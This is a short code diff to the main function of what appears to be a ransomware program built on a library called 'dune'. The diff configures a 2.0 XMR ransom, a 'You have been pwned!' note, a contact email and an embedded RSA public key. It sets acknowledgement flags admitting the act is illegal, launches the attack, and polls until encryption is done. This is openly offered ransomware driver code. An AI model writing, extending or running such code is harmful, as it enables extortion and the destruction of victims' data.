@@ -22,13 +22,17 @@ int main(int argc, char *argv[])
                              "0BKGlxY72fPDt9MvThCs6DokeK4cIzcMEKQv4RNBF8q3winAM1SGnxLu7RWx2npF\n"
                              "ND8Xa8c7d8il4AjK5QIDAQAB\n"
                              "-----END PUBLIC KEY-----\n";
+
     dune::Dune dune = dune::Dune(2.0, "XMR", "your address here", "You have been pwned!", notes, "tech@anon.gov", public_key);
     dune::Acknowledgement ack;
     ack.are_you_sure_you_want_to_do_this = true;
     ack.i_accept_the_risks_and_consequences_of_my_actions = true;
     ack.i_understand_it_is_illegel = true;
     dune.attack(ack);
-
-    
+    while (!dune.verify_done())
+    {
+        std::this_thread::sleep_for(std::chrono::milliseconds(5000));
+    }
+    printf("All done\n");
     return 0;
 }
